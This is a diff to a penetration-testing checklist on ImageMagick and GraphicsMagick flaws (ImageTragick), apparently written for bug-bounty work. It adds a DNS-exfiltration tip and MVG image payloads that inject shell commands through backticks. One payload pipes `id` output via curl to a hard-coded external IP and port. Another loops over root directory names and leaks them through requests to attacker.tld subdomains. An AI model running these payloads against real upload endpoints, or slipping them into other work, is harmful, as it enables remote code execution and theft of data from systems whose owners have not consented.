@@ -1,6 +1,8 @@
 # Image Magic / Graphics Magic vulnerabilities
 
 - [ ] Anywhere where we can upload a picture, check for Image Tragic. Especially in profile picture uploads.
+- [ ] Firewalls could be blocking certain requests. Try exfiltration through DNS.
+  - https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
 - [ ] Check if we are able to edit an uploaded image. Does the request contain arguments? If the backend is using GraphicsMagic, we could inject commands.
   - https://hackerone.com/reports/212696
 
@@ -55,5 +57,14 @@ x.png
 push graphic-context
 viewbox 0 0 640 480
 image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://167.71.9.74:1337/ -d @- > /dev/null`'
+pop graphic-context
+```
+
+- https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
+
+```
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`'
 pop graphic-context
 ```
